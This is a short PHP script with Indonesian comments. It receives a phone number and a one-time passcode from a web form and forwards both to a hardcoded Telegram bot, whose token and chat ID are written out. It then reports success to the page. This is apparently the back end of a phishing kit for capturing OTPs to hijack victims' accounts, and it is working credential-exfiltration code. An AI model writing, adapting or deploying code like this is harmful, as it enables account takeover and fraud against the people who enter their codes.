<?php
// Ambil konten JSON dari permintaan
$request = file_get_contents("php://input");
$data = json_decode($request, true);

if (isset($data['phone']) && isset($data['code'])) {
    $phone = $data['phone'];
    $code = $data['code'];

    // Token dan chat_id bot Telegram
    $bot_token = '7451357338:AAGaHAyD96AMy2WVLgSbfQi0ovel3Y31IWk';
    $chat_id = '6269902580';

    // Format pesan untuk dikirim ke Telegram
    $message = "Nomor: $phone\nOtp: $code";

    // Kirim pesan ke Telegram
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $post_data = [
        'chat_id' => $chat_id,
        'text' => $message
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Berikan respons ke frontend
    echo json_encode(["status" => "success", "message" => "Pesan berhasil dikirim"]);
} else {
    http_response_code(400);
    echo json_encode(["status" => "error", "message" => "Data tidak valid"]);
}
?>
